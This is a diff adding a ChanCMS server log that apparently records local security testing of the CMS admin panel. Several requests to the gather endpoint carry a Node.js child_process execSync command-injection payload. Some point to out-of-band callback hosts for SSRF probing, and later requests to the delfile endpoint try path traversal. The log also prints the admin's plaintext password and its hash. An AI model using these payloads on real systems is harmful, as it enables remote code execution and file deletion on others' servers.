@@ -1,0 +1,466 @@
+2025-07-11 10:40 +08:00: ChanCMS is running on 7001
+2025-07-11 10:40 +08:00: GET /public/cover/sea/07.png 200 232702 - 4.058 ms
+2025-07-11 10:40 +08:00: Login attempt: { username: 'admin' }
+2025-07-11 10:40 +08:00: Direct query result: {
+2025-07-11 10:40 +08:00:   id: 12,
+2025-07-11 10:40 +08:00:   username: 'admin',
+2025-07-11 10:40 +08:00:   password: '$2a$10$pdygs6uahorxNcAOw7RQC.6KkByPiWdg44oDuBNVWr.zfEcy4FLDS',
+2025-07-11 10:40 +08:00:   status: '0'
+2025-07-11 10:40 +08:00: }
+2025-07-11 10:40 +08:00: User found: { id: 12, username: 'admin', status: '0' }
+2025-07-11 10:40 +08:00: Comparing passwords...
+2025-07-11 10:40 +08:00: Input password: 123456
+2025-07-11 10:40 +08:00: Stored hash: $2a$10$pdygs6uahorxNcAOw7RQC.6KkByPiWdg44oDuBNVWr.zfEcy4FLDS
+2025-07-11 10:40 +08:00: Password match result: true
+2025-07-11 10:40 +08:00: Login successful, generating token
+2025-07-11 10:40 +08:00: Token generated: { token: 'eyJhbGciOiJIUzI1NiIs...' }
+2025-07-11 10:40 +08:00: Menus retrieved: success
+2025-07-11 10:40 +08:00: Response structure: {
+2025-07-11 10:40 +08:00:   code: 200,
+2025-07-11 10:40 +08:00:   msg: 'success',
+2025-07-11 10:40 +08:00:   data_keys: [ 'status', 'username', 'token' ],
+2025-07-11 10:40 +08:00:   menus_included: true
+2025-07-11 10:40 +08:00: }
+2025-07-11 10:40 +08:00: POST /base/user/login 200 4206 - 103.010 ms
+2025-07-11 10:40 +08:00: 111 { id: 12, username: 'admin', avatar: '', status: '0' }
+2025-07-11 10:40 +08:00: GET /base/user/detail 200 157 - 5.092 ms
+2025-07-11 10:40 +08:00: GET /cms/loginLog/delete 200 45 - 8.098 ms
+2025-07-11 10:40 +08:00: POST /cms/loginLog/create 200 45 - 8.057 ms
+2025-07-11 10:40 +08:00: GET /base/menu/allRouter 200 3988 - 3.533 ms
+2025-07-11 10:40 +08:00: GET /public/admin/assets/css/index3.css 200 566 - 0.685 ms
+2025-07-11 10:40 +08:00: GET /public/admin/assets/js/@vueuse.js 200 1797 - 4.544 ms
+2025-07-11 10:40 +08:00: GET /public/admin/assets/js/index4.js 200 8279 - 3.860 ms
+2025-07-11 10:40 +08:00: GET /public/admin/assets/js/tslib.js 200 1275 - 2.333 ms
+2025-07-11 10:40 +08:00: GET /public/admin/assets/js/zrender.js 200 214243 - 2.851 ms
+2025-07-11 10:40 +08:00: GET /public/admin/assets/js/echarts.js 200 822794 - 2.988 ms
+2025-07-11 10:40 +08:00: GET /public/admin/assets/svg/ico-up.svg 200 7292 - 5.763 ms
+2025-07-11 10:40 +08:00: GET /public/admin/assets/svg/ico-will.svg 200 13237 - 4.679 ms
+2025-07-11 10:40 +08:00: GET /public/admin/assets/svg/ico-message.svg 200 6904 - 5.929 ms
+2025-07-11 10:40 +08:00: GET /public/admin/assets/svg/ico-article.svg 200 6359 - 5.397 ms
+2025-07-11 10:40 +08:00: GET /cms/article/tongji 200 180 - 14.852 ms
+2025-07-11 10:40 +08:00: GET /cms/site/runEnv 200 88 - 1.608 ms
+2025-07-11 10:40 +08:00: GET /public/admin/assets/js/index19.js 200 5317 - 1.129 ms
+2025-07-11 10:40 +08:00: GET /public/admin/assets/js/index22.js 200 396 - 2.696 ms
+2025-07-11 10:40 +08:00: GET /public/admin/assets/js/config.js 200 2572 - 2.001 ms
+2025-07-11 10:40 +08:00: GET /public/admin/assets/js/qiniu.js 200 2499 - 1.943 ms
+2025-07-11 10:40 +08:00: GET /public/admin/assets/js/wechat.js 200 2232 - 2.290 ms
+2025-07-11 10:40 +08:00: GET /public/admin/assets/css/index8.css 200 62 - 2.787 ms
+2025-07-11 10:40 +08:00: GET /public/admin/assets/js/upload.js 200 1335 - 0.477 ms
+2025-07-11 10:40 +08:00: GET /base/config/getlist?type_code=wechat_minip 200 240 - 9.293 ms
+2025-07-11 10:40 +08:00: GET /base/config/getlist?type_code=qiniu_oss 200 374 - 9.486 ms
+2025-07-11 10:40 +08:00: GET /cms/site/info 200 38 - 13.109 ms
+2025-07-11 10:40 +08:00: GET /cms/site/info 304 - - 3.123 ms
+2025-07-11 10:40 +08:00: GET /cms/sysApp/folder 200 47 - 1.700 ms
+2025-07-11 10:41 +08:00: GET /cms/article/tongji 304 - - 4.373 ms
+2025-07-11 10:41 +08:00: GET /cms/site/runEnv 304 - - 1.266 ms
+2025-07-11 10:41 +08:00: GET /cms/site/info 304 - - 2.431 ms
+2025-07-11 10:41 +08:00: GET /base/config/getlist?type_code=qiniu_oss 304 - - 3.911 ms
+2025-07-11 10:41 +08:00: GET /base/config/getlist?type_code=wechat_minip 304 - - 3.744 ms
+2025-07-11 10:41 +08:00: GET /cms/sysApp/folder 304 - - 3.441 ms
+2025-07-11 10:41 +08:00: GET /cms/site/info 304 - - 4.695 ms
+2025-07-11 10:41 +08:00: GET /public/admin/assets/js/category.js 200 672 - 1.672 ms
+2025-07-11 10:41 +08:00: GET /public/admin/assets/js/index10.js 200 3528 - 1.266 ms
+2025-07-11 10:41 +08:00: GET /public/admin/assets/css/index5.css 200 49 - 1.300 ms
+2025-07-11 10:41 +08:00: GET /cms/category/search?q= 200 3034 - 2.762 ms
+2025-07-11 10:41 +08:00: GET /public/admin/assets/js/index9.js 200 5412 - 0.854 ms
+2025-07-11 10:41 +08:00: GET /public/admin/assets/js/article.js 200 755 - 2.014 ms
+2025-07-11 10:41 +08:00: GET /public/admin/assets/css/index4.css 200 123 - 1.166 ms
+2025-07-11 10:41 +08:00: GET /cms/article/search?cur=1&pageSize=20&keyword=&cid=0 200 3196 - 3.800 ms
+2025-07-11 10:41 +08:00: GET /cms/category/find 200 3034 - 1.824 ms
+2025-07-11 10:42 +08:00: GET /cms/article/tongji 304 - - 5.247 ms
+2025-07-11 10:42 +08:00: GET /cms/site/runEnv 304 - - 2.190 ms
+2025-07-11 10:44 +08:00: GET /base/config/getlist?type_code=wechat_minip 304 - - 11.262 ms
+2025-07-11 10:44 +08:00: GET /base/config/getlist?type_code=qiniu_oss 304 - - 9.165 ms
+2025-07-11 10:44 +08:00: GET /cms/site/info 304 - - 4.210 ms
+2025-07-11 10:44 +08:00: GET /cms/site/info 304 - - 3.480 ms
+2025-07-11 10:44 +08:00: GET /cms/sysApp/folder 304 - - 1.945 ms
+2025-07-11 10:44 +08:00: GET /cms/category/search?q= 304 - - 2.487 ms
+2025-07-11 10:44 +08:00: GET /cms/article/search?cur=1&pageSize=20&keyword=&cid=0 304 - - 3.355 ms
+2025-07-11 10:44 +08:00: GET /cms/category/find 304 - - 3.043 ms
+2025-07-11 10:44 +08:00: GET /public/admin/assets/js/index20.js 200 2568 - 0.610 ms
+2025-07-11 10:44 +08:00: GET /public/admin/assets/js/slide.js 200 493 - 1.948 ms
+2025-07-11 10:44 +08:00: GET /cms/slide/list?cur=1&pageSize=20 200 622 - 3.830 ms
+2025-07-11 10:44 +08:00: 404--> GET-/public/uploads/default/2024/12/15/1734245257724_source_001.jpg-::ffff:127.0.0.1
+2025-07-11 10:44 +08:00: GET /public/uploads/default/2024/12/15/1734245257724_source_001.jpg 200 1425 - 18.290 ms
+2025-07-11 10:44 +08:00: GET /public/cover/02.jpg 200 25298 - 1.194 ms
+2025-07-11 10:44 +08:00: GET /public/cover/01.jpg 200 24470 - 0.764 ms
+2025-07-11 10:44 +08:00: GET /public/admin/assets/js/index21.js 200 3423 - 0.599 ms
+2025-07-11 10:44 +08:00: GET /public/admin/assets/js/tag.js 200 626 - 0.863 ms
+2025-07-11 10:44 +08:00: GET /public/admin/assets/css/index9.css 200 49 - 0.954 ms
+2025-07-11 10:44 +08:00: GET /cms/tag/search?cur=1&pageSize=10&keyword= 200 159 - 4.750 ms
+2025-07-11 10:44 +08:00: GET /public/admin/assets/js/index13.js 200 3323 - 0.544 ms
+2025-07-11 10:44 +08:00: GET /public/admin/assets/css/index6.css 200 49 - 1.196 ms
+2025-07-11 10:44 +08:00: GET /public/admin/assets/js/frag.js 200 530 - 1.142 ms
+2025-07-11 10:44 +08:00: GET /cms/frag/search?cur=1&keywords=&pageSize=20 200 232 - 5.014 ms
+2025-07-11 10:44 +08:00: GET /public/admin/assets/js/index14.js 200 2369 - 0.784 ms
+2025-07-11 10:44 +08:00: GET /public/admin/assets/js/friendlink.js 200 528 - 1.444 ms
+2025-07-11 10:44 +08:00: GET /public/admin/assets/css/edit3.css 200 - - 1.199 ms
+2025-07-11 10:44 +08:00: GET /cms/friendlink/list?cur=1&pageSize=20 200 226 - 5.551 ms
+2025-07-11 10:44 +08:00: GET /public/admin/assets/js/index17.js 200 2665 - 0.972 ms
+2025-07-11 10:44 +08:00: GET /public/admin/assets/js/message.js 200 513 - 0.593 ms
+2025-07-11 10:44 +08:00: GET /cms/message/list?cur=1&pageSize=20 200 79 - 3.675 ms
+2025-07-11 10:44 +08:00: GET /public/admin/assets/js/index11.js 200 3678 - 0.662 ms
+2025-07-11 10:44 +08:00: GET /public/admin/assets/js/collect.js 200 691 - 0.609 ms
+2025-07-11 10:44 +08:00: GET /cms/collect/list?cur=1&pageSize=20 200 1700 - 3.967 ms
+2025-07-11 10:44 +08:00: POST /cms/collect/getArticle 200 7584 - 501.455 ms
+2025-07-11 10:44 +08:00: POST /cms/article/create 200 45 - 12.253 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/index15.js 200 3393 - 0.641 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/gather.js 200 598 - 0.853 ms
+2025-07-11 10:45 +08:00: GET /cms/gather/list?cur=1&pageSize=20 200 430 - 4.444 ms
+2025-07-11 10:45 +08:00: GET /cms/gather/getArticle?targetUrl=https:%2F%2Fapi.qqsuu.cn%2Fapi%2Fdm-60s%3Ftype%3Djson&parseData=let+cont+%3D+%27%27%3B%0Adata.data.news.map((item)%3D%3E%7B%0A+++cont+%2B%3D%27%3Cp%3E%27%2B+item%2B%27%3C%2Fp%3E%27%0A%7D)%0Areturn+%7Bcontent:cont+,weiyu:data.data.weiyu,title:%27ChanCMS%E6%97%A9%E9%97%B4%E6%96%B0%E9%97%BB%E2%80%94%27%2Bdata.data.date%7D%3B 200 5077 - 383.534 ms
+2025-07-11 10:45 +08:00: POST /cms/article/create 200 45 - 11.031 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/css/element-plus.css 304 - - 0.616 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/css/index2.css 304 - - 1.857 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/css/nprogress.css 304 - - 1.858 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/css/index.css 304 - - 1.836 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/css/saduo.css 304 - - 1.850 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/css/vue3-puzzle-vcode.css 304 - - 1.991 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/css/index3.css 304 - - 1.372 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/css/index4.css 304 - - 3.180 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/css/index6.css 304 - - 3.286 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/css/index5.css 304 - - 3.425 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/css/edit3.css 304 - - 3.449 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/css/index8.css 304 - - 3.418 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/css/index9.css 304 - - 1.120 ms
+2025-07-11 10:45 +08:00: GET /public/admin/index.html 304 - - 1.618 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/index.js 304 - - 0.319 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/css/element-plus.css 304 - - 0.467 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/css/saduo.css 304 - - 1.569 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/css/nprogress.css 304 - - 1.133 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/css/index.css 304 - - 0.517 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/@vue.js 304 - - 0.718 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/pinia.js 304 - - 0.644 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/pinia-plugin-persist.js 304 - - 0.388 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/@popperjs.js 304 - - 0.824 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/@element-plus.js 304 - - 0.821 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/lodash-es.js 304 - - 0.790 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/dayjs.js 304 - - 0.961 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/vue-router.js 304 - - 0.525 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/async-validator.js 304 - - 0.293 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/normalize-wheel-es.js 304 - - 1.223 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/memoize-one.js 304 - - 0.980 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/axios.js 304 - - 1.106 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/element-plus.js 304 - - 1.911 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/@ctrl.js 304 - - 2.346 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/js-cookie.js 304 - - 0.400 ms
+2025-07-11 10:45 +08:00: GET /public/admin/assets/js/nprogress.js 304 - - 0.277 ms
+2025-07-11 10:45 +08:00: GET /base/menu/allRouter 200 32 - 4.355 ms
+2025-07-11 10:45 +08:00: GET /public/admin/favicon.png 200 2165 - 1.738 ms
+2025-07-11 10:47 +08:00: ChanCMS is running on 7001
+2025-07-11 10:48 +08:00: GET /cms/gather/getArticle?targetUrl=http://9b0a69c6d3.ipv6.bypass.eu.org 500 582 - 10055.370 ms
+2025-07-11 10:51 +08:00: 404--> POST-/api/collect/getPages-::ffff:127.0.0.1
+2025-07-11 10:51 +08:00: POST /api/collect/getPages 200 1383 - 23.327 ms
+2025-07-11 10:51 +08:00: 404--> GET-/public/template/default/css/saduo@1.1.1.css-::ffff:127.0.0.1
+2025-07-11 10:51 +08:00: GET /public/template/default/css/saduo@1.1.1.css 200 1406 - 6.937 ms
+2025-07-11 11:00 +08:00: GET /cms/gather/getArticle?targetUrl=http://9b0a69c6d3.ipv6.bypass.eu.org&parseData=return+process.mainModule.require(%27child_process%27).execSync(%27calc%27).toString() 500 582 - 10020.792 ms
+2025-07-11 11:00 +08:00: GET /cms/gather/getArticle?targetUrl=http://test.com&parseData=return+process.mainModule.require(%27child_process%27).execSync(%27calc%27).toString() 500 955 - 2696.238 ms
+2025-07-11 11:01 +08:00: GET /cms/gather/getArticle?targetUrl=http://test.com&parseData=return+process.mainModule.require(%27child_process%27).execSync(%27calc%27).toString() 500 955 - 1998.301 ms
+2025-07-11 11:02 +08:00: GET /cms/gather/getArticle?parseData=return+process.mainModule.require(%27child_process%27).execSync(%27calc%27).toString() 500 604 - 2.131 ms
+2025-07-11 11:02 +08:00: GET /cms/gather/getArticle?targetUrl=http://example.com&parseData=return+process.mainModule.require(%27child_process%27).execSync(%27calc%27).toString() 500 955 - 704.819 ms
+2025-07-11 11:03 +08:00: GET /cms/gather/getArticle?targetUrl=http://jsonplaceholder.typicode.com/posts/1&parseData=return+process.mainModule.require(%27child_process%27).execSync(%27calc%27).toString()HTTP/1.1 500 461 - 1053.247 ms
+2025-07-11 11:04 +08:00: GET /cms/gather/getArticle?targetUrl=http://jsonplaceholder.typicode.com/posts/1&parseData=return+process.mainModule.require(%27child_process%27).execSync(%27calc%27).toString() 200 323 - 1387.064 ms
+2025-07-11 11:09 +08:00: GET /cms/gather/getArticle 500 604 - 7.211 ms
+2025-07-11 11:10 +08:00: 404--> POST-/gather/getPages-::ffff:127.0.0.1
+2025-07-11 11:10 +08:00: POST /cms/gather/getPages 200 1378 - 11.338 ms
+2025-07-11 11:11 +08:00: POST /cms/collect/getPages 500 1537 - 26195.438 ms
+2025-07-11 11:12 +08:00: POST /cms/collect/getPages 500 1537 - 26375.675 ms
+2025-07-11 11:14 +08:00: GET /cms/gather/getArticle?targetUrl=http://jsonplaceholder.typicode.com/posts/1&parseData=return+process.mainModule.require(%27child_process%27).execSync(%27calc%27).toString() 200 323 - 1277.358 ms
+2025-07-11 11:14 +08:00: GET /cms/gather/getArticle?targetUrl=http://160991933b.ipv6.bypass.eu.org&parseData=return+process.mainModule.require(%27child_process%27).execSync(%27calc%27).toString() 500 582 - 10015.198 ms
+2025-07-11 11:17 +08:00: POST /cms/collect/getPages 500 1537 - 26525.793 ms
+2025-07-11 11:20 +08:00: POST /collect/getArticle 200 61 - 1121.716 ms
+2025-07-11 11:26 +08:00: GET / 200 50326 - 37.034 ms
+2025-07-11 11:26 +08:00: GET /public/template/default//css/saduo@0.0.2.css 304 - - 0.812 ms
+2025-07-11 11:26 +08:00: GET /public/template/default//css/saduo-wap@0.0.1.css 304 - - 0.995 ms
+2025-07-11 11:26 +08:00: GET /public/template/default//css/swiper.min.css 304 - - 1.415 ms
+2025-07-11 11:26 +08:00: GET /public/template/default//js/swiper.min.js 304 - - 1.384 ms
+2025-07-11 11:26 +08:00: GET /public/template/default//css/main.css 304 - - 2.357 ms
+2025-07-11 11:26 +08:00: GET /public/template/default//css/prism.css 304 - - 3.792 ms
+2025-07-11 11:26 +08:00: 404--> GET-/public/uploads/default/2024/12/15/1734245257724_source_001.jpg-::ffff:127.0.0.1
+2025-07-11 11:26 +08:00: GET /public/uploads/default/2024/12/15/1734245257724_source_001.jpg 304 - - 12.610 ms
+2025-07-11 11:26 +08:00: GET /public/template/default//font/chanyue.ttf 304 - - 0.583 ms
+2025-07-11 11:26 +08:00: GET /public/cover/02.jpg 304 - - 1.236 ms
+2025-07-11 11:26 +08:00: GET /public/cover/10.jpg 304 - - 1.042 ms
+2025-07-11 11:26 +08:00: GET /public/cover/01.jpg 304 - - 1.075 ms
+2025-07-11 11:26 +08:00: GET /public/cover/06.jpg 304 - - 1.035 ms
+2025-07-11 11:26 +08:00: GET /public/template/default//img/logo.svg 304 - - 0.452 ms
+2025-07-11 11:26 +08:00: GET /public/cover/04.jpg 304 - - 0.377 ms
+2025-07-11 11:26 +08:00: GET /public/template/default//js/prism.js 304 - - 1.223 ms
+2025-07-11 11:26 +08:00: GET /public/cover/07.jpg 304 - - 0.937 ms
+2025-07-11 11:26 +08:00: GET /public/template/default//js/main.js 304 - - 1.083 ms
+2025-07-11 11:27 +08:00: 404--> POST-/article/delfile-::ffff:127.0.0.1
+2025-07-11 11:27 +08:00: POST /cms/article/delfile 200 1378 - 10.845 ms
+2025-07-11 11:27 +08:00: 404--> GET-/public/template/default/css/saduo@1.1.1.css-::ffff:127.0.0.1
+2025-07-11 11:27 +08:00: GET /public/template/default/css/saduo@1.1.1.css 200 1406 - 3.883 ms
+2025-07-11 11:27 +08:00: 404--> POST-/article/delfile-::ffff:127.0.0.1
+2025-07-11 11:27 +08:00: POST /article/delfile 200 1378 - 4.879 ms
+2025-07-11 11:32 +08:00: GET /article/delfile 200 32 - 3.508 ms
+2025-07-11 11:33 +08:00: GET /public/admin/index.html 304 - - 0.806 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/css/element-plus.css 304 - - 0.293 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/css/index.css 304 - - 3.793 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/css/nprogress.css 304 - - 2.815 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/css/saduo.css 304 - - 1.169 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/@vue.js 304 - - 1.428 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/index.js 304 - - 0.881 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/pinia.js 304 - - 0.466 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/pinia-plugin-persist.js 304 - - 1.599 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/vue-router.js 304 - - 1.190 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/dayjs.js 304 - - 1.200 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/@element-plus.js 304 - - 1.642 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/lodash-es.js 304 - - 0.806 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/@popperjs.js 304 - - 0.247 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/async-validator.js 304 - - 1.260 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/memoize-one.js 304 - - 1.156 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/@ctrl.js 304 - - 0.507 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/normalize-wheel-es.js 304 - - 1.824 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/element-plus.js 304 - - 1.472 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/axios.js 304 - - 0.337 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/js-cookie.js 304 - - 0.737 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/nprogress.js 304 - - 1.157 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/css/index2.css 304 - - 0.809 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/css/vue3-puzzle-vcode.css 304 - - 0.869 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/index5.js 304 - - 1.143 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/login_log.js 304 - - 0.587 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/vue3-puzzle-vcode.js 304 - - 0.713 ms
+2025-07-11 11:33 +08:00: GET /public/cover/sea/05.png 200 139626 - 1.622 ms
+2025-07-11 11:33 +08:00: Login attempt: { username: 'admin' }
+2025-07-11 11:33 +08:00: Direct query result: {
+2025-07-11 11:33 +08:00:   id: 12,
+2025-07-11 11:33 +08:00:   username: 'admin',
+2025-07-11 11:33 +08:00:   password: '$2a$10$pdygs6uahorxNcAOw7RQC.6KkByPiWdg44oDuBNVWr.zfEcy4FLDS',
+2025-07-11 11:33 +08:00:   status: '0'
+2025-07-11 11:33 +08:00: }
+2025-07-11 11:33 +08:00: User found: { id: 12, username: 'admin', status: '0' }
+2025-07-11 11:33 +08:00: Comparing passwords...
+2025-07-11 11:33 +08:00: Input password: 123456
+2025-07-11 11:33 +08:00: Stored hash: $2a$10$pdygs6uahorxNcAOw7RQC.6KkByPiWdg44oDuBNVWr.zfEcy4FLDS
+2025-07-11 11:33 +08:00: Password match result: true
+2025-07-11 11:33 +08:00: Login successful, generating token
+2025-07-11 11:33 +08:00: Token generated: { token: 'eyJhbGciOiJIUzI1NiIs...' }
+2025-07-11 11:33 +08:00: Menus retrieved: success
+2025-07-11 11:33 +08:00: Response structure: {
+2025-07-11 11:33 +08:00:   code: 200,
+2025-07-11 11:33 +08:00:   msg: 'success',
+2025-07-11 11:33 +08:00:   data_keys: [ 'status', 'username', 'token' ],
+2025-07-11 11:33 +08:00:   menus_included: true
+2025-07-11 11:33 +08:00: }
+2025-07-11 11:33 +08:00: POST /base/user/login 200 4206 - 80.505 ms
+2025-07-11 11:33 +08:00: 111 { id: 12, username: 'admin', avatar: '', status: '0' }
+2025-07-11 11:33 +08:00: GET /base/user/detail 304 - - 4.065 ms
+2025-07-11 11:33 +08:00: GET /cms/loginLog/delete 304 - - 9.408 ms
+2025-07-11 11:33 +08:00: POST /cms/loginLog/create 200 45 - 8.879 ms
+2025-07-11 11:33 +08:00: GET /base/menu/allRouter 200 3988 - 3.986 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/css/index3.css 304 - - 1.237 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/index4.js 304 - - 1.862 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/zrender.js 304 - - 1.345 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/tslib.js 304 - - 1.332 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/echarts.js 304 - - 1.310 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/js/@vueuse.js 304 - - 1.504 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/svg/ico-will.svg 304 - - 1.292 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/svg/ico-message.svg 304 - - 1.345 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/svg/ico-up.svg 304 - - 1.289 ms
+2025-07-11 11:33 +08:00: GET /public/admin/assets/svg/ico-article.svg 304 - - 1.276 ms
+2025-07-11 11:33 +08:00: GET /cms/article/tongji 200 180 - 10.243 ms
+2025-07-11 11:33 +08:00: GET /cms/site/runEnv 304 - - 1.919 ms
+2025-07-11 11:35 +08:00: GET /article/delfile?url=../../../../../../../../../abcdefg.txt 200 40 - 4.941 ms
+2025-07-11 11:35 +08:00: GET /favicon.ico 200 16958 - 0.567 ms
+2025-07-11 11:39 +08:00: GET /article/delfile?url=../../../../../../../../../abcdefg.txt 200 41 - 5.543 ms
+2025-07-11 11:39 +08:00: GET / 200 50326 - 26.991 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//css/saduo@0.0.2.css 200 31350 - 1.490 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//css/main.css 200 17708 - 1.516 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//css/swiper.min.css 200 16465 - 1.603 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//css/saduo-wap@0.0.1.css 200 946 - 1.645 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//css/prism.css 200 13979 - 1.387 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//js/swiper.min.js 200 143023 - 0.710 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//img/logo.svg 200 810 - 2.030 ms
+2025-07-11 11:39 +08:00: GET /public/cover/07.jpg 200 21075 - 1.918 ms
+2025-07-11 11:39 +08:00: GET /public/cover/04.jpg 200 33528 - 3.481 ms
+2025-07-11 11:39 +08:00: 404--> GET-/public/uploads/default/2024/12/15/1734245257724_source_001.jpg-::ffff:127.0.0.1
+2025-07-11 11:39 +08:00: GET /public/uploads/default/2024/12/15/1734245257724_source_001.jpg 304 - - 7.227 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//js/prism.js 200 596251 - 2.505 ms
+2025-07-11 11:39 +08:00: GET /public/cover/02.jpg 304 - - 0.595 ms
+2025-07-11 11:39 +08:00: GET /public/cover/01.jpg 304 - - 0.369 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//font/chanyue.ttf 200 8868 - 2.568 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//js/main.js 200 6506 - 1.993 ms
+2025-07-11 11:39 +08:00: GET /public/cover/06.jpg 200 33092 - 1.662 ms
+2025-07-11 11:39 +08:00: GET /public/cover/10.jpg 200 23331 - 1.917 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//img/favicon.png 200 2165 - 0.808 ms
+2025-07-11 11:39 +08:00: GET / 304 - - 17.618 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//css/saduo@0.0.2.css 304 - - 0.585 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//css/swiper.min.css 304 - - 4.113 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//css/main.css 304 - - 2.520 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//css/prism.css 304 - - 1.485 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//css/saduo-wap@0.0.1.css 304 - - 1.115 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//js/swiper.min.js 304 - - 1.265 ms
+2025-07-11 11:39 +08:00: GET /public/cover/04.jpg 304 - - 2.247 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//js/prism.js 304 - - 2.304 ms
+2025-07-11 11:39 +08:00: GET /public/cover/02.jpg 304 - - 2.358 ms
+2025-07-11 11:39 +08:00: GET /public/cover/07.jpg 304 - - 1.156 ms
+2025-07-11 11:39 +08:00: GET /public/cover/01.jpg 304 - - 1.451 ms
+2025-07-11 11:39 +08:00: 404--> GET-/public/uploads/default/2024/12/15/1734245257724_source_001.jpg-::ffff:127.0.0.1
+2025-07-11 11:39 +08:00: GET /public/uploads/default/2024/12/15/1734245257724_source_001.jpg 304 - - 14.773 ms
+2025-07-11 11:39 +08:00: GET /public/cover/06.jpg 304 - - 0.657 ms
+2025-07-11 11:39 +08:00: GET /public/cover/10.jpg 304 - - 0.588 ms
+2025-07-11 11:39 +08:00: GET /public/template/default//js/main.js 304 - - 0.707 ms
+2025-07-11 11:39 +08:00: GET /public/admin/assets/js/echarts.js 304 - - 0.559 ms
+2025-07-11 11:39 +08:00: GET /public/admin/assets/js/index4.js 304 - - 0.647 ms
+2025-07-11 11:39 +08:00: GET /public/admin/assets/js/tslib.js 304 - - 1.161 ms
+2025-07-11 11:39 +08:00: GET /public/admin/assets/js/@vueuse.js 304 - - 1.183 ms
+2025-07-11 11:39 +08:00: GET /public/admin/assets/css/index3.css 304 - - 1.180 ms
+2025-07-11 11:39 +08:00: GET /public/admin/assets/js/zrender.js 304 - - 1.415 ms
+2025-07-11 11:39 +08:00: GET /public/admin/assets/svg/ico-article.svg 304 - - 2.571 ms
